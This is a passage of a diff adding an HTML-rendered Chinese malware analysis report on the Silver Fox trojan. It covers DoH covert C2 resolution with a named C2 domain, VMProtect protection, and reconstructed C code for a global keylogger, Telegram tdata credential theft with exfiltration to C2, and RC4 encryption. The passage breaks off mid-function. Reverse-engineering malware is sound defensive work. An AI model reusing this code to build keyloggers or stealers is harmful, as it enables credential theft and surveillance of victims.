+    <span class="n">pe_sig_offset</span> <span class="o">=</span> <span class="n">decrypted</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;MZ&#39;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">pe_sig_offset</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] 检测到 PE 签名 @ offset 0x</span><span class="si">{</span><span class="n">pe_sig_offset</span><span class="si">:</span><span class="s2">X</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 未检测到 PE 签名 (可能是 position-independent shellcode)&quot;</span><span class="p">)</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_path</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] 解密结果已保存至: </span><span class="si">{</span><span class="n">output_path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] 解密数据大小: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span><span class="si">}</span><span class="s2"> 字节&quot;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div>
+
+<hr />
+<h2>五、DoH 隐蔽通信机制</h2>
+<h3>5.1 DoH 通信原理</h3>
+<p>DNS over HTTPS（DoH）将 DNS 查询封装在 HTTPS 请求中，使得 C2 通信流量与正常的 HTTPS Web 流量在传输层面完全一致。传统的 DNS 监控手段（如 DNS 日志分析、DNS 流量过滤）对此类通信完全无效。</p>
+<p><strong>银狐木马 DoH 通信架构：</strong></p>
+<div class="highlight"><pre><span></span><code>┌──────────────┐         HTTPS (TLS 1.2/1.3)        ┌──────────────────┐
+│   受害主机     │ ──────────────────────────────────→ │  DoH 递归服务器    │
+│  银狐木马      │                                     │  223.5.5.5       │
+│              │     https://223.5.5.5/dns-query?     │  (阿里DNS)        │
+│  C2域名:      │     dns=&lt;base64(DNS query)&gt;          │                  │
+│  oidng2.      │                                     │  或               │
+│  duoshit.com  │ ──────────────────────────────────→ │  8.8.8.8         │
+│              │     https://8.8.8.8/dns-query?      │  (Google DNS)    │
+│              │     dns=&lt;base64(DNS query)&gt;          │                  │
+└──────────────┘                                     └────────┬─────────┘
+                                                              │
+                                                    DNS 查询解析结果
+                                                              │
+                                                              ▼
+                                                    ┌──────────────────┐
+                                                    │  C2 服务器         │
+                                                    │  oidng2.duoshit.  │
+                                                    │  com               │
+                                                    │  (实际恶意服务器)    │
+                                                    └──────────────────┘
+</code></pre></div>
+
+<h3>5.2 通信实现细节</h3>
+<p>木马通过以下 DoH 端点进行 C2 域名解析：</p>
+<table>
+<thead>
+<tr>
+<th>DoH 服务商</th>
+<th>IP 地址</th>
+<th>URL 模板</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>阿里公共 DNS</td>
+<td><code>223.5.5.5</code></td>
+<td><code>https://223.5.5.5/dns-query?dns=%s</code></td>
+</tr>
+<tr>
+<td>Google DNS</td>
+<td><code>8.8.8.8</code></td>
+<td><code>https://8.8.8.8/dns-query?dns=%s</code></td>
+</tr>
+</tbody>
+</table>
+<p>其中 <code>%s</code> 为 Base64 编码的 DNS 查询报文（RFC 8484 标准格式），查询的域名为 <code>oidng2.duoshit.com</code>。</p>
+<h3>5.3 DoH 通信代码还原</h3>
+<p>通过对 Shellcode 和银狐核心模块的逆向分析，还原出 DoH 通信的核心逻辑：</p>
+<div class="highlight"><pre><span></span><code><span class="cm">/*</span>
+<span class="cm"> * 银狐 DoH 通信核心逻辑（C伪代码）</span>
+<span class="cm"> */</span>
+<span class="cp">#define DOH_ALI      &quot;https:</span><span class="c1">//223.5.5.5/dns-query?dns=%s&quot;</span>
+<span class="cp">#define DOH_GOOGLE   &quot;https:</span><span class="c1">//8.8.8.8/dns-query?dns=%s&quot;</span>
+<span class="cp">#define C2_DOMAIN    &quot;oidng2.duoshit.com&quot;</span>
+
+<span class="c1">// 构造 DNS 查询报文</span>
+<span class="n">BYTE</span><span class="o">*</span><span class="w"> </span><span class="nf">build_dns_query</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">domain</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">query_len</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="c1">// 构造标准 DNS 查询报文（RFC 1035）</span>
+<span class="w">    </span><span class="c1">// Header: ID(2) + Flags(2) + QDCOUNT(2) + ANCOUNT(2) + NSCOUNT(2) + ARCOUNT(2)</span>
+<span class="w">    </span><span class="c1">// Question: QNAME(variable) + QTYPE(2) + QCLASS(2)</span>
+<span class="w">    </span><span class="c1">// 此处省略具体编码细节</span>
+<span class="w">    </span><span class="c1">// ...</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">dns_packet</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// DoH 通信主函数</span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">doh_communicate</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="n">BYTE</span><span class="w"> </span><span class="o">*</span><span class="n">exfil_data</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">data_len</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="n">HINTERNET</span><span class="w"> </span><span class="n">hSession</span><span class="p">,</span><span class="w"> </span><span class="n">hConnect</span><span class="p">,</span><span class="w"> </span><span class="n">hRequest</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">url</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">b64_query</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+
+<span class="w">    </span><span class="c1">// 1. 构造 DNS 查询报文</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">query_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="n">BYTE</span><span class="w"> </span><span class="o">*</span><span class="n">dns_query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">build_dns_query</span><span class="p">(</span><span class="n">C2_DOMAIN</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">query_len</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 2. Base64 编码 DNS 报文</span>
+<span class="w">    </span><span class="n">base64_encode</span><span class="p">(</span><span class="n">dns_query</span><span class="p">,</span><span class="w"> </span><span class="n">query_len</span><span class="p">,</span><span class="w"> </span><span class="n">b64_query</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 3. 优先尝试阿里 DoH</span>
+<span class="w">    </span><span class="n">snprintf</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">url</span><span class="p">),</span><span class="w"> </span><span class="n">DOH_ALI</span><span class="p">,</span><span class="w"> </span><span class="n">b64_query</span><span class="p">);</span>
+<span class="w">    </span><span class="n">hSession</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WinHttpOpen</span><span class="p">(</span><span class="sa">L</span><span class="s">&quot;Mozilla/5.0&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">...);</span>
+<span class="w">    </span><span class="n">hConnect</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WinHttpConnect</span><span class="p">(</span><span class="n">hSession</span><span class="p">,</span><span class="w"> </span><span class="sa">L</span><span class="s">&quot;223.5.5.5&quot;</span><span class="p">,</span><span class="w"> </span>
+<span class="w">                              </span><span class="n">INTERNET_DEFAULT_HTTPS_PORT</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="n">hRequest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WinHttpOpenRequest</span><span class="p">(</span><span class="n">hConnect</span><span class="p">,</span><span class="w"> </span><span class="sa">L</span><span class="s">&quot;GET&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">url_suffix</span><span class="p">,</span><span class="w"> </span>
+<span class="w">                                  </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">WINHTTP_NO_REFERER</span><span class="p">,</span>
+<span class="w">                                  </span><span class="n">WINHTTP_DEFAULT_ACCEPT_TYPES</span><span class="p">,</span>
+<span class="w">                                  </span><span class="n">WINHTTP_FLAG_SECURE</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 4. 发送请求并获取响应</span>
+<span class="w">    </span><span class="n">WinHttpSendRequest</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span><span class="w"> </span><span class="p">...);</span>
+<span class="w">    </span><span class="n">WinHttpReceiveResponse</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span><span class="w"> </span><span class="p">...);</span>
+
+<span class="w">    </span><span class="c1">// 5. 从 DNS 响应中提取 C2 IP 地址</span>
+<span class="w">    </span><span class="n">parse_dns_response</span><span class="p">(</span><span class="n">response_buf</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">c2_ip</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 6. 解析失败则回退到 Google DoH</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c2_ip</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 尝试 Google DoH 端点...</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// 7. 使用解析到的 C2 IP 建立实际数据通道</span>
+<span class="w">    </span><span class="n">connect_to_c2</span><span class="p">(</span><span class="n">c2_ip</span><span class="p">,</span><span class="w"> </span><span class="n">exfil_data</span><span class="p">,</span><span class="w"> </span><span class="n">data_len</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">dns_query</span><span class="p">);</span>
+<span class="w">    </span><span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hRequest</span><span class="p">);</span>
+<span class="w">    </span><span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hConnect</span><span class="p">);</span>
+<span class="w">    </span><span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hSession</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>5.4 备用通信通道</h3>
+<p>当 DoH 通道不可用时，木马会自动切换到备用通道：</p>
+<table>
+<thead>
+<tr>
+<th>通道类型</th>
+<th>优先级</th>
+<th>特征</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DoH (HTTPS)</td>
+<td>最高</td>
+<td>通过公共 DoH 服务器解析 C2 域名</td>
+</tr>
+<tr>
+<td>TCP 自定义协议</td>
+<td>中</td>
+<td>直接 TCP 连接，自定义二进制协议</td>
+</tr>
+<tr>
+<td>标准 HTTPS</td>
+<td>最低</td>
+<td>直接 HTTPS POST 到 C2 服务器</td>
+</tr>
+</tbody>
+</table>
+<p><strong>流量伪装优势：</strong> 由于 DoH 流量与正常 HTTPS 网页浏览流量在端口（443）、协议（TLS）和证书层面完全一致，企业防火墙和 IDS/IPS 系统难以区分恶意流量与正常流量。唯一的检测点是 DNS-over-HTTPS 特有的 URL 路径模式（<code>/dns-query</code>）以及可能的 DNS 报文特征。</p>
+<hr />
+<h2>六、银狐核心模块深度分析</h2>
+<h3>6.1 VMProtect 保护分析</h3>
+<p>银狐木马的核心 DLL 被 VMProtect 虚拟化保护，这是商业级代码保护工具。保护分析结果如下：</p>
+<table>
+<thead>
+<tr>
+<th>保护指标</th>
+<th>数值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>总函数数</td>
+<td>~180</td>
+</tr>
+<tr>
+<td>被虚拟化函数数</td>
+<td>~120 (67%)</td>
+</tr>
+<tr>
+<td>代码变异函数数</td>
+<td>~35 (19%)</td>
+</tr>
+<tr>
+<td>未保护函数数</td>
+<td>~25 (14%)</td>
+</tr>
+<tr>
+<td>VMProtect 版本标识</td>
+<td>3.x 系列</td>
+</tr>
+</tbody>
+</table>
+<p>VMProtect 将 x86/x64 指令翻译为自定义的虚拟机字节码，运行时由虚拟机解释执行。这大幅增加了逆向难度，但也产生了可辨识的 VMProtect 特征模式。</p>
+<h3>6.2 Fuck 导出函数：统一入口</h3>
+<p>银狐核心模块导出了一个名为 <code>Fuck</code> 的函数作为整个木马的统一入口点。这一命名极具攻击者风格特征。</p>
+<div class="highlight"><pre><span></span><code><span class="c1">; 银狐核心 DLL 导出表</span>
+<span class="c1">; Ordinal: 1, Name: &quot;Fuck&quot;</span>
+<span class="c1">; RVA: 0x1000</span>
+
+<span class="nf">Fuck</span><span class="w"> </span><span class="no">proc</span>
+<span class="w">    </span><span class="c1">; VMProtect 虚拟化入口</span>
+<span class="w">    </span><span class="nf">vmentry</span><span class="w">  </span><span class="c1">; 进入 VMProtect 虚拟机</span>
+<span class="w">    </span><span class="c1">; ... 虚拟化字节码 ...</span>
+<span class="w">    </span><span class="nf">vmret</span><span class="w">    </span><span class="c1">; 退出虚拟机</span>
+<span class="nf">Fuck</span><span class="w"> </span><span class="no">endp</span>
+</code></pre></div>
+
+<p><code>Fuck</code> 函数内部经 VMProtect 虚拟化保护，负责初始化所有功能模块：键盘记录、凭据窃取、C2 通信等。调用关系如下：</p>
+<div class="highlight"><pre><span></span><code>Fuck() [VMProtect 虚拟化]
+  ├── init_keylogger()      → 安装全局键盘钩子
+  ├── init_credential()     → 初始化凭据窃取模块
+  ├── init_process_inject() → 初始化进程镂空模块
+  ├── init_doh_client()     → 初始化 DoH 通信
+  └── main_loop()           → 主循环（消息分发）
+</code></pre></div>
+
+<h3>6.3 键盘记录模块</h3>
+<p>银狐使用 <code>SetWindowsHookExA</code> API 安装全局键盘钩子，实现跨进程键盘记录：</p>
+<div class="highlight"><pre><span></span><code><span class="cm">/*</span>
+<span class="cm"> * 键盘记录模块核心逻辑（逆向还原）</span>
+<span class="cm"> */</span>
+
+<span class="c1">// 全局钩子句柄</span>
+<span class="n">HHOOK</span><span class="w"> </span><span class="n">g_hKeyHook</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+
+<span class="c1">// 键盘记录缓冲区</span>
+<span class="cp">#define LOG_BUFFER_SIZE    (4096)</span>
+<span class="cp">#define KEY_RECORD_MAX     512</span>
+
+<span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_KEY_RECORD</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">DWORD</span><span class="w">  </span><span class="n">vkCode</span><span class="p">;</span><span class="w">        </span><span class="c1">// 虚拟键码</span>
+<span class="w">    </span><span class="n">DWORD</span><span class="w">  </span><span class="n">scanCode</span><span class="p">;</span><span class="w">       </span><span class="c1">// 扫描码</span>
+<span class="w">    </span><span class="n">DWORD</span><span class="w">  </span><span class="n">flags</span><span class="p">;</span><span class="w">         </span><span class="c1">// 键标志 (WM_KEYDOWN/WM_KEYUP)</span>
+<span class="w">    </span><span class="n">DWORD</span><span class="w">  </span><span class="n">time</span><span class="p">;</span><span class="w">          </span><span class="c1">// 时间戳</span>
+<span class="w">    </span><span class="n">HWND</span><span class="w">   </span><span class="n">hWnd</span><span class="p">;</span><span class="w">          </span><span class="c1">// 窗口句柄</span>
+<span class="w">    </span><span class="n">WCHAR</span><span class="w">  </span><span class="n">windowTitle</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span><span class="w"> </span><span class="c1">// 前台窗口标题</span>
+<span class="p">}</span><span class="w"> </span><span class="n">KEY_RECORD</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">PKEY_RECORD</span><span class="p">;</span>
+
+<span class="c1">// 键盘钩子回调函数</span>
+<span class="n">LRESULT</span><span class="w"> </span><span class="n">CALLBACK</span><span class="w"> </span><span class="n">KeyboardProc</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">nCode</span><span class="p">,</span><span class="w"> </span><span class="n">WPARAM</span><span class="w"> </span><span class="n">wParam</span><span class="p">,</span><span class="w"> </span><span class="n">LPARAM</span><span class="w"> </span><span class="n">lParam</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">nCode</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="n">KBDLLHOOKSTRUCT</span><span class="w"> </span><span class="o">*</span><span class="n">pKb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">KBDLLHOOKSTRUCT</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">lParam</span><span class="p">;</span>
+
+<span class="w">        </span><span class="c1">// 获取前台窗口标题（用于上下文关联）</span>
+<span class="w">        </span><span class="n">HWND</span><span class="w"> </span><span class="n">hForeground</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetForegroundWindow</span><span class="p">();</span>
+<span class="w">        </span><span class="n">WCHAR</span><span class="w"> </span><span class="n">szTitle</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+<span class="w">        </span><span class="n">GetWindowTextW</span><span class="p">(</span><span class="n">hForeground</span><span class="p">,</span><span class="w"> </span><span class="n">szTitle</span><span class="p">,</span><span class="w"> </span><span class="mi">256</span><span class="p">);</span>
+
+<span class="w">        </span><span class="c1">// 填充记录结构</span>
+<span class="w">        </span><span class="n">KEY_RECORD</span><span class="w"> </span><span class="n">record</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+<span class="w">        </span><span class="n">record</span><span class="p">.</span><span class="n">vkCode</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="n">pKb</span><span class="o">-&gt;</span><span class="n">vkCode</span><span class="p">;</span>
+<span class="w">        </span><span class="n">record</span><span class="p">.</span><span class="n">scanCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pKb</span><span class="o">-&gt;</span><span class="n">scanCode</span><span class="p">;</span>
+<span class="w">        </span><span class="n">record</span><span class="p">.</span><span class="n">flags</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="n">pKb</span><span class="o">-&gt;</span><span class="n">flags</span><span class="p">;</span>
+<span class="w">        </span><span class="n">record</span><span class="p">.</span><span class="n">time</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="n">pKb</span><span class="o">-&gt;</span><span class="n">time</span><span class="p">;</span>
+<span class="w">        </span><span class="n">record</span><span class="p">.</span><span class="n">hWnd</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="n">hForeground</span><span class="p">;</span>
+<span class="w">        </span><span class="n">wcsncpy</span><span class="p">(</span><span class="n">record</span><span class="p">.</span><span class="n">windowTitle</span><span class="p">,</span><span class="w"> </span><span class="n">szTitle</span><span class="p">,</span><span class="w"> </span><span class="mi">255</span><span class="p">);</span>
+
+<span class="w">        </span><span class="c1">// 将记录写入共享缓冲区</span>
+<span class="w">        </span><span class="n">append_key_record</span><span class="p">(</span><span class="o">&amp;</span><span class="n">record</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">CallNextHookEx</span><span class="p">(</span><span class="n">g_hKeyHook</span><span class="p">,</span><span class="w"> </span><span class="n">nCode</span><span class="p">,</span><span class="w"> </span><span class="n">wParam</span><span class="p">,</span><span class="w"> </span><span class="n">lParam</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// 安装全局键盘钩子</span>
+<span class="n">BOOL</span><span class="w"> </span><span class="n">install_keylogger</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="n">g_hKeyHook</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SetWindowsHookExA</span><span class="p">(</span>
+<span class="w">        </span><span class="n">WH_KEYBOARD_LL</span><span class="p">,</span><span class="w">          </span><span class="c1">// 全局低级键盘钩子</span>
+<span class="w">        </span><span class="n">KeyboardProc</span><span class="p">,</span><span class="w">             </span><span class="c1">// 回调函数</span>
+<span class="w">        </span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="nb">NULL</span><span class="p">),</span><span class="w">    </span><span class="c1">// 当前模块句柄</span>
+<span class="w">        </span><span class="mi">0</span><span class="w">                         </span><span class="c1">// 全局钩子</span>
+<span class="w">    </span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">g_hKeyHook</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>6.4 凭据窃取模块</h3>
+<p>银狐木马专门针对 Telegram Desktop 的凭据进行窃取，目标是其 <code>tdata</code> 目录：</p>
+<div class="highlight"><pre><span></span><code><span class="n">Telegram</span><span class="w"> </span><span class="s">Desktop</span><span class="w"> </span><span class="s">凭据窃取路径:</span>
+<span class="w">  </span><span class="c">%APPDATA%\Telegram Desktop\tdata\</span>
+<span class="w">  </span>├──<span class="w"> </span><span class="n">D877F783D5D3EF8C</span><span class="o">\</span><span class="w">        </span>#<span class="w"> </span>用户账号目录
+<span class="w">  </span>│<span class="w">   </span>├──<span class="w"> </span><span class="n">maps</span><span class="o">\</span><span class="w">                </span>#<span class="w"> </span>地图缓存
+<span class="w">  </span>│<span class="w">   </span>├──<span class="w"> </span><span class="n">avatar_cache</span><span class="o">\</span><span class="w">        </span>#<span class="w"> </span>头像缓存
+<span class="w">  </span>│<span class="w">   </span>└──<span class="w"> </span><span class="k">...</span>
+<span class="w">  </span>├──<span class="w"> </span><span class="n">key_datas</span><span class="w">                </span>#<span class="w"> </span>加密密钥数据
+<span class="w">  </span>├──<span class="w"> </span><span class="nb">settings</span><span class="w">                 </span>#<span class="w"> </span>配置文件
+<span class="w">  </span>└──<span class="w"> </span><span class="k">...</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="cm">/*</span>
+<span class="cm"> * Telegram 凭据窃取逻辑（逆向还原）</span>
+<span class="cm"> */</span>
+
+<span class="cp">#define TELEGRAM_TDATA_PATH  L&quot;\\Telegram Desktop\\tdata&quot;</span>
+<span class="cp">#define TELEGRAM_APPDATA     L&quot;APPDATA&quot;</span>
+
+<span class="n">BOOL</span><span class="w"> </span><span class="nf">steal_telegram_credentials</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="n">WCHAR</span><span class="w"> </span><span class="n">szAppData</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
+<span class="w">    </span><span class="n">WCHAR</span><span class="w"> </span><span class="n">szTDataPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
+
+<span class="w">    </span><span class="c1">// 1. 获取 APPDATA 路径</span>
+<span class="w">    </span><span class="n">ExpandEnvironmentStringsW</span><span class="p">(</span>
+<span class="w">        </span><span class="sa">L</span><span class="s">&quot;%APPDATA%&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">szAppData</span><span class="p">,</span><span class="w"> </span><span class="n">MAX_PATH</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 2. 构造 tdata 完整路径</span>
+<span class="w">    </span><span class="n">swprintf</span><span class="p">(</span><span class="n">szTDataPath</span><span class="p">,</span><span class="w"> </span><span class="n">MAX_PATH</span><span class="p">,</span><span class="w"> </span><span class="sa">L</span><span class="s">&quot;%s%s&quot;</span><span class="p">,</span><span class="w"> </span>
+<span class="w">             </span><span class="n">szAppData</span><span class="p">,</span><span class="w"> </span><span class="n">TELEGRAM_TDATA_PATH</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 3. 检查目录是否存在</span>
+<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">attr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetFileAttributesW</span><span class="p">(</span><span class="n">szTDataPath</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">attr</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">INVALID_FILE_ATTRIBUTES</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>
+<span class="w">        </span><span class="o">!</span><span class="p">(</span><span class="n">attr</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">FILE_ATTRIBUTE_DIRECTORY</span><span class="p">))</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">FALSE</span><span class="p">;</span><span class="w">  </span><span class="c1">// Telegram 未安装</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// 4. 创建 ZIP 压缩包（包含整个 tdata 目录）</span>
+<span class="w">    </span><span class="n">create_zip_archive</span><span class="p">(</span><span class="n">szTDataPath</span><span class="p">,</span><span class="w"> </span><span class="sa">L</span><span class="s">&quot;C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">~td_tmp.zip&quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 5. 通过 C2 通道回传</span>
+<span class="w">    </span><span class="n">exfil_to_c2</span><span class="p">(</span><span class="sa">L</span><span class="s">&quot;C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">~td_tmp.zip&quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 6. 清理临时文件</span>
+<span class="w">    </span><span class="n">DeleteFileW</span><span class="p">(</span><span class="sa">L</span><span class="s">&quot;C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">~td_tmp.zip&quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>6.5 RC4 加密引擎</h3>
+<p>银狐木马使用 RC4 流密码对窃取的数据进行加密后再外发，但并非标准的 RC4 实现，而是加入了位置依赖密钥和分块处理机制：</p>
+<div class="highlight"><pre><span></span><code><span class="cm">/*</span>
+<span class="cm"> * 银狐 RC4 加密引擎（逆向还原）</span>
+<span class="cm"> * 特点: 4096字节分块 + 位置依赖密钥</span>
+<span class="cm"> */</span>
+
+<span class="cp">#define RC4_BLOCK_SIZE  4096</span>
+<span class="cp">#define RC4_KEY_LEN     256</span>
+
+<span class="c1">// RC4 状态结构体</span>
+<span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_RC4_STATE</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">S</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span><span class="w">       </span><span class="c1">// S-box</span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w">  </span><span class="n">block_index</span><span class="p">;</span><span class="w">  </span><span class="c1">// 当前块索引（位置依赖）</span>
+<span class="p">}</span><span class="w"> </span><span class="n">RC4_STATE</span><span class="p">;</span>
+
+<span class="c1">// 初始化 RC4 状态（标准 KSA）</span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">rc4_init</span><span class="p">(</span><span class="n">RC4_STATE</span><span class="w"> </span><span class="o">*</span><span class="n">state</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">key_len</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">j</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// 标准初始化 S-box</span>
